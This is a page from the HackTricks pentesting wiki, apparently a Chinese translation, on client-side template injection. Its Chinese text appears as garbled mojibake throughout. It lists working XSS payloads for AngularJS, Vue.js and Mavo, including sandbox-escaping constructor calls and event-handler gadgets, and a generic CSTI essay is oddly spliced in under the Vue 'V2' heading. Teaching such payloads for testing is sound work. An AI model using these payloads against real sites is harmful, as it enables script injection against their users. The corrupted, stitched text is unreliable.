<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# æ¦‚è¦

è¿™ç±»ä¼¼äº**æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥**ï¼ˆssti-server-side-template-injection/ï¼‰ï¼Œä½†æ˜¯åœ¨**å®¢æˆ·ç«¯**ä¸­ã€‚**SSTI**å¯ä»¥è®©ä½ åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Š**æ‰§è¡Œä»£ç **ï¼Œè€Œ**CSTI**å¯ä»¥è®©ä½ åœ¨å—å®³è€…ä¸­æ‰§è¡Œä»»æ„çš„JavaScriptä»£ç ã€‚

æµ‹è¯•è¿™ä¸ªæ¼æ´çš„æ–¹æ³•ä¸**SSTI**çš„æƒ…å†µéå¸¸ç›¸ä¼¼ï¼Œè§£é‡Šå™¨ä¼šæœŸæœ›åœ¨**åŒå¤§æ‹¬å·ä¹‹é—´æ‰§è¡ŒæŸäº›å†…å®¹**å¹¶æ‰§è¡Œå®ƒã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ç±»ä¼¼äº`{{ 7-7 }}`çš„å†…å®¹ï¼Œå¦‚æœæœåŠ¡å™¨**å­˜åœ¨æ¼æ´**ï¼Œä½ å°†çœ‹åˆ°ä¸€ä¸ª`0`ï¼Œå¦‚æœæ²¡æœ‰æ¼æ´ï¼Œä½ å°†çœ‹åˆ°åŸå§‹å†…å®¹ï¼š`{{ 7-7 }}`

# AngularJS

AngularJSæ˜¯ä¸€ä¸ªæµè¡Œçš„JavaScriptåº“ï¼Œå®ƒä¼šæ‰«æåŒ…å«**`ng-app`**å±æ€§ï¼ˆä¹Ÿç§°ä¸ºAngularJSæŒ‡ä»¤ï¼‰çš„HTMLèŠ‚ç‚¹çš„å†…å®¹ã€‚å½“å°†æŒ‡ä»¤æ·»åŠ åˆ°HTMLä»£ç ä¸­æ—¶ï¼Œä½ å¯ä»¥åœ¨åŒå¤§æ‹¬å·ä¸­æ‰§è¡ŒJavaScriptè¡¨è¾¾å¼ã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä½ çš„**è¾“å…¥**åœ¨HTMLçš„**body**ä¸­**åå°„**ï¼Œå¹¶ä¸”bodyå®šä¹‰äº†`ng-app`ï¼š**`<body ng-app>`**

ä½ å¯ä»¥ä½¿ç”¨å¤§æ‹¬å·åœ¨**body**ä¸­**æ·»åŠ **ä»»æ„çš„JavaScriptä»£ç ï¼š
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
æ‚¨å¯ä»¥åœ¨[http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/)æ‰¾åˆ°ä¸€ä¸ªéå¸¸**åŸºæœ¬çš„åœ¨çº¿ç¤ºä¾‹**ï¼Œå±•ç¤ºäº†**AngularJS**ä¸­çš„æ¼æ´ã€‚

{% hint style="danger" %}
[**Angular 1.6å·²ç§»é™¤äº†æ²™ç®±**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html#:\~:text=The%20Angular%20expression%20sandbox%20will,smaller%20and%20easier%20to%20maintain.\&text=Removing%20the%20expression%20sandbox%20does,surface%20of%20Angular%201%20applications.)ï¼Œå› æ­¤ä»è¯¥ç‰ˆæœ¬å¼€å§‹ï¼Œåƒ`{{constructor.constructor('alert(1)')()}}`æˆ–`<input ng-focus=$event.view.alert('XSS')>`è¿™æ ·çš„æœ‰æ•ˆè½½è·åº”è¯¥å¯ä»¥ä½¿ç”¨ã€‚
{% endhint %}

# VueJS

æ‚¨å¯ä»¥åœ¨[https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)æ‰¾åˆ°ä¸€ä¸ª**æ˜“å—æ”»å‡»çš„vue.js**å®ç°ã€‚

æœ‰æ•ˆè½½è·ç¤ºä¾‹ï¼š[`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor\(%27alert\(%22foo%22\)%27\)\(\)%7D%7D)

è¿™é‡Œæ˜¯æ˜“å—æ”»å‡»ç¤ºä¾‹çš„**æºä»£ç **ï¼š[https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)
```markup
<!-- Google Research - Vue.js-->
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
```
ä¸€ä¸ªå…³äºVUEä¸­CSTIçš„éå¸¸å¥½çš„å¸–å­å¯ä»¥åœ¨[https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)æ‰¾åˆ°

## **V3**
```
{{_openBlock.constructor('alert(1)')()}}
```
## **V2**

## å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ (Client-Side Template Injection)

åœ¨è®¸å¤šç°ä»£Webåº”ç”¨ç¨‹åºä¸­ï¼Œå®¢æˆ·ç«¯æ¨¡æ¿å¼•æ“è¢«å¹¿æ³›ä½¿ç”¨æ¥åŠ¨æ€ç”ŸæˆHTMLé¡µé¢ã€‚è¿™äº›æ¨¡æ¿å¼•æ“å…è®¸å¼€å‘äººå‘˜å°†æ•°æ®å’Œæ¨¡æ¿ç»“åˆèµ·æ¥ï¼Œä»¥ç”Ÿæˆæœ€ç»ˆçš„HTMLè¾“å‡ºã€‚ç„¶è€Œï¼Œå¦‚æœä¸æ­£ç¡®åœ°ä½¿ç”¨æˆ–é…ç½®ï¼Œå®¢æˆ·ç«¯æ¨¡æ¿å¼•æ“å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ï¼Œå…¶ä¸­æœ€å¸¸è§çš„æ˜¯å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆClient-Side Template Injectionï¼ŒCSTIï¼‰ã€‚

### ä»€ä¹ˆæ˜¯å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ

å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œåˆ©ç”¨äº†å®¢æˆ·ç«¯æ¨¡æ¿å¼•æ“çš„æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨Webåº”ç”¨ç¨‹åºçš„å‰ç«¯ä»£ç ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™ç§æ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨æ¨¡æ¿å¼•æ“ä½¿ç”¨ç”¨æˆ·æä¾›çš„æ•°æ®æ¥ç”ŸæˆHTMLè¾“å‡ºæ—¶ã€‚

### å¦‚ä½•åˆ©ç”¨å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ

æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ç”¨æˆ·è¾“å…¥ä¸­æ³¨å…¥æ¶æ„æ¨¡æ¿ä»£ç æ¥åˆ©ç”¨å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚è¿™äº›æ¶æ„æ¨¡æ¿ä»£ç å°†è¢«æ¨¡æ¿å¼•æ“è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ã€‚

### å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥çš„å±å®³æ€§

å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹å±å®³ï¼š

- æ‰§è¡Œä»»æ„ä»£ç ï¼šæ”»å‡»è€…å¯ä»¥åœ¨å—å½±å“çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼ŒåŒ…æ‹¬JavaScriptä»£ç ã€‚
- æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼šæ”»å‡»è€…å¯ä»¥è®¿é—®å’Œçªƒå–åº”ç”¨ç¨‹åºä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·å‡­æ®ã€ä¼šè¯ä»¤ç‰Œç­‰ã€‚
- è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼šæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä»è€Œå¯¼è‡´XSSæ”»å‡»ã€‚
- ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ç»•è¿‡åº”ç”¨ç¨‹åºçš„å®‰å…¨æ§åˆ¶ï¼Œä¾‹å¦‚è®¿é—®æœªæˆæƒçš„åŠŸèƒ½æˆ–æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚

### å¦‚ä½•é˜²å¾¡å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ

è¦é˜²å¾¡å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œä»¥é˜²æ­¢æ¶æ„æ¨¡æ¿ä»£ç çš„æ³¨å…¥ã€‚
- å®‰å…¨é…ç½®ï¼šæ­£ç¡®é…ç½®å’Œä½¿ç”¨æ¨¡æ¿å¼•æ“ï¼Œé¿å…å°†ç”¨æˆ·æä¾›çš„æ•°æ®ç›´æ¥ä¼ é€’ç»™æ¨¡æ¿å¼•æ“ã€‚
- æœ€å°æƒé™åŸåˆ™ï¼šå°†æ¨¡æ¿å¼•æ“çš„æ‰§è¡Œæƒé™é™åˆ¶åœ¨æœ€ä½é™åº¦ï¼Œä»¥å‡å°‘æ½œåœ¨çš„æ”»å‡»é¢ã€‚
- å®‰å…¨ç¼–ç å®è·µï¼šéµå¾ªå®‰å…¨ç¼–ç å®è·µï¼Œå¦‚é¿å…ä½¿ç”¨eval()å‡½æ•°å’ŒåŠ¨æ€æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„ä»£ç ã€‚

### ç»“è®º

å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ˜¯ä¸€ç§å¸¸è§çš„Webåº”ç”¨ç¨‹åºå®‰å…¨æ¼æ´ï¼Œå¯ä»¥å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚å¼€å‘äººå‘˜å’Œå®‰å…¨ä¸“ä¸šäººå‘˜åº”è¯¥äº†è§£è¿™ç§æ¼æ´çš„å·¥ä½œåŸç†ï¼Œå¹¶é‡‡å–é€‚å½“çš„é˜²å¾¡æªæ–½æ¥ä¿æŠ¤Webåº”ç”¨ç¨‹åºå…å—æ­¤ç±»æ”»å‡»ã€‚
```
{{constructor.constructor('alert(1)')()}}
```
Credit: [Mario Heiderich](https://twitter.com/cure53berlin)

**åœ¨** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected) **ä¸­æŸ¥çœ‹æ›´å¤šVUEæœ‰æ•ˆè½½è·**

# Mavo

æœ‰æ•ˆè½½è·ï¼š
```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```
**æ›´å¤šæœ‰æ•ˆè½½è·è¯·å‚è€ƒ** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

# **æš´åŠ›æ£€æµ‹åˆ—è¡¨**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
